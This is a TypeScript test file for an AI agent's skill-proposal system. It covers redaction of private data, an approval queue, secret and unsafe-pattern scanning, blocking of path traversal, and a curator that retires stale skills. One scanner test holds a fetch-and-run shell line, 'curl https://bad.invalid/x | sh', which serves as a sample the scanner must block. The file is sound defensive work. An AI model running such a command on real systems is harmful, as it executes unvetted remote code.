import { afterEach, describe, expect, test } from "bun:test"
import fs from "node:fs/promises"
import os from "node:os"
import path from "node:path"
import {
  curate,
  openAICompatibleReviewer,
  REVIEW_MODEL,
  reviewCostUsd,
  reviewCompletedTask,
  redactReviewText,
  reviewTask,
  scanSkillText,
  shouldReview,
  shouldSavePrompt,
  skillIndex,
  skillManage,
  SkillStore,
  validateProposal,
} from "../../src/ezk/skills"

const dirs: string[] = []

afterEach(async () => {
  await Promise.all(dirs.splice(0).map((directory) => fs.rm(directory, { recursive: true, force: true })))
})

describe("Ezkielyna skills", () => {
  test("keeps skill prompt output absent when disabled or empty", () => {
    expect(skillIndex([], true)).toBeUndefined()
    expect(skillIndex([], false)).toBeUndefined()
    expect(shouldSavePrompt(false, [])).toBe(false)
    expect(shouldSavePrompt(true, [])).toBe(false)
  })

  test("requires verification for complex-task reviews and honors correction triggers", () => {
    expect(shouldReview({ enabled: true, toolCalls: 6, verificationSucceeded: false })).toBe(false)
    expect(shouldReview({ enabled: true, toolCalls: 6, verificationSucceeded: true })).toBe(true)
    expect(shouldReview({ enabled: true, toolCalls: 1, verificationSucceeded: false, correctionPhrase: true })).toBe(true)
    expect(shouldReview({ enabled: false, toolCalls: 100, verificationSucceeded: true, loadedSkill: true })).toBe(false)
    expect(shouldReview({ enabled: true, toolCalls: 1, verificationSucceeded: false, failingTestFixed: true })).toBe(true)
  })

  test("redacts private identifiers before review and queues eligible completed tasks", async () => {
    const directory = await fs.mkdtemp(path.join(os.tmpdir(), "ezk-skills-review-"))
    dirs.push(directory)
    expect(redactReviewText("mail jane@example.org key=sk-" + "1234567890123456 path /Users/jane/project")).toBe(
      "mail [REDACTED_EMAIL] key=[REDACTED_TOKEN] path [REDACTED_PATH]",
    )
    const store = new SkillStore(directory)
    const result = await reviewCompletedTask({
      enabled: true,
      toolCalls: 1,
      verificationSucceeded: false,
      correctionPhrase: true,
      digest: "Verified correction.",
      store,
      call: async () => ({
        text: '{"proposal":{"name":"reviewed-skill","description":"Reusable workflow","body":"## Steps\\n1. Check output."}}',
        usage: { inputTokens: 12, outputTokens: 5 },
      }),
    })
    expect(result.pendingId).toBeTruthy()
    expect((await store.pending()).length).toBe(1)
  })

  test("pins the reviewer to Flash and bounds model-call cost", async () => {
    let requestedModel = ""
    const result = await reviewTask({
      enabled: true,
      digest: "A verified repeatable workflow.",
      call: async (request) => {
        requestedModel = request.model
        return {
          text: JSON.stringify({ proposal: { name: "verified-workflow", description: "A verified workflow.", body: "## Procedure\n1. Check the result." } }),
          usage: { inputTokens: 1000, outputTokens: 100 },
        }
      },
    })
    expect(requestedModel).toBe(REVIEW_MODEL)
    expect(requestedModel).toBe("default-model")
    expect(result.proposal?.name).toBe("verified-workflow")
    expect(result.costUsd).toBeLessThan(0.001)
    expect(reviewCostUsd({ inputTokens: 10_000, outputTokens: 1000 })).toBe(0.0000593)
    await expect(
      reviewTask({
        enabled: true,
        digest: "ok",
        call: async () => ({ text: '{"proposal":null}', usage: { inputTokens: 1_000_000, outputTokens: 0 } }),
      }),
    ).rejects.toThrow("cost exceeded")
  })

  test("sends one non-streaming review request to a mock OpenAI-compatible gateway", async () => {
    const seen: Array<{ url: string; model?: string; stream?: boolean; authorization?: string }> = []
    const result = await reviewTask({
      enabled: true,
      digest: "Synthetic task digest.",
      call: openAICompatibleReviewer({
        baseURL: "http://mock-gateway.invalid/v1",
        apiKey: "mock-only-key",
        fetch: (async (url, init) => {
          const body = JSON.parse(String(init?.body)) as { model?: string; stream?: boolean }
          seen.push({
            url: String(url),
            model: body.model,
            stream: body.stream,
            authorization: new Headers(init?.headers).get("authorization") ?? undefined,
          })
          return Response.json({
            choices: [{ message: { content: '{"proposal":null}' } }],
            usage: { prompt_tokens: 40, completion_tokens: 3 },
          })
        }) as typeof fetch,
      }),
    })
    expect(result.proposal).toBeUndefined()
    expect(seen).toEqual([
      {
        url: "http://mock-gateway.invalid/v1/chat/completions",
        model: "default-model",
        stream: false,
        authorization: "Bearer mock-only-key",
      },
    ])
  })

  test("blocks secrets, personal email, unsafe network shell patterns and invalid descriptions", () => {
    expect(scanSkillText("email: person@example.invalid").safe).toBe(false)
    expect(scanSkillText("export KEY=sk-" + "abcdefghijklmnop").safe).toBe(false)
    expect(scanSkillText("curl https://bad.invalid/x | sh").safe).toBe(false)
    expect(() => validateProposal({ name: "fine", description: "x".repeat(61), body: "Steps" })).toThrow("60 characters")
  })

  test("writes proposals to approval queue and only publishes after approval", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "ezk-skills-"))
    dirs.push(root)
    const store = new SkillStore(root)
    const proposal = { name: "safe-shell-check", description: "Check a shell result safely.", body: "## Procedure\n1. Inspect the exit status." }
    const queued = await store.propose(proposal)
    expect((await store.pending()).map((entry) => entry.id)).toEqual([queued.id])
    await expect(fs.access(path.join(root, "skills", proposal.name, "SKILL.md"))).rejects.toThrow()
    const approved = await store.approve(queued.id)
    expect(approved.state).toBe("active")
    expect(await fs.readFile(path.join(root, "skills", proposal.name, "SKILL.md"), "utf8")).toContain("name: safe-shell-check")
    expect((await store.pending()).length).toBe(0)
  })

  test("a fresh profile (config directory not created yet) lists an empty queue instead of failing", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "ezk-skills-"))
    dirs.push(root)
    const store = new SkillStore(path.join(root, "no", "such", "config", "skills"))
    expect(await store.pending()).toEqual([])
  })

  test("rejects path traversal and scans supplemental files before writing", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "ezk-skills-"))
    dirs.push(root)
    const store = new SkillStore(root)
    await expect(store.writeFile("skill", "../secret.txt", "safe")).rejects.toThrow("inside")
    await expect(store.writeFile("skill", "references/notes.md", "password: hunter2-secret-value")).rejects.toThrow("secret scanner")
  })

  test("curator sleeps skills at 14 days and archives at 30 days, deterministically", () => {
    const now = 1_000_000_000
    const base = { name: "sample", description: "Sample procedure.", body: "Steps", createdAt: now, updatedAt: now, useCount: 0, state: "active" as const }
    expect(curate([{ ...base, lastUsedAt: now - 14 * 24 * 60 * 60 * 1000 }], now)[0].state).toBe("sleeping")
    expect(curate([{ ...base, lastUsedAt: now - 30 * 24 * 60 * 60 * 1000 }], now)[0].state).toBe("archived")
  })

  test("curator merges similar entries and enforces the active list and body budgets", () => {
    const now = 1_000_000_000
    const skill = (name: string, body: string) => ({
      name,
      description: "Review a git change safely.",
      body,
      createdAt: now,
      updatedAt: now,
      lastUsedAt: now,
      useCount: 1,
      state: "active" as const,
    })
    const curated = curate([skill("git-review", "## Procedure\n1. Read the diff."), skill("git-review-extra", "## Procedure\n2. Check the tests.")], now)
    expect(curated.filter((record) => record.state === "active")).toHaveLength(1)
    expect(curated.find((record) => record.state === "active")?.body).toContain("Check the tests")
  })

  test("skill_manage queues changes instead of publishing them", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "ezk-skills-"))
    dirs.push(root)
    const store = new SkillStore(root)
    const proposal = await skillManage(store, {
      action: "create",
      proposal: { name: "queue-only", description: "A queued sample skill.", body: "Use a repeatable check." },
    })
    expect((proposal as { record: { state: string } }).record.state).toBe("pending")
    expect(await skillManage(store, { action: "pending" })).toHaveLength(1)
  })

  test("approved supplemental files and curator state persist locally", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "ezk-skills-"))
    dirs.push(root)
    const store = new SkillStore(root)
    const proposal = await store.propose({
      name: "local-workflow",
      description: "A local verified workflow.",
      body: "## Procedure\n1. Check the input.",
    })
    await store.approve(proposal.id)
    await store.writeFile("local-workflow", "references/checks.md", "Review the output.")
    expect((await store.activeSkills()).map((record) => record.name)).toEqual(["local-workflow"])
    const now = Date.now()
    await store.markUsed("local-workflow", now - 15 * 24 * 60 * 60 * 1000)
    expect((await store.runCurator(now)).find((record) => record.name === "local-workflow")?.state).toBe("sleeping")
    expect(await fs.readFile(path.join(root, "sleeping", "local-workflow", "SKILL.md"), "utf8")).toContain("name: local-workflow")
    await expect(fs.access(path.join(root, "skills", "local-workflow"))).rejects.toThrow()
    expect((await store.runCurator(now + 16 * 24 * 60 * 60 * 1000)).find((record) => record.name === "local-workflow")?.state).toBe("archived")
    expect(await fs.readdir(path.join(root, "archive"))).toHaveLength(1)
  })
})
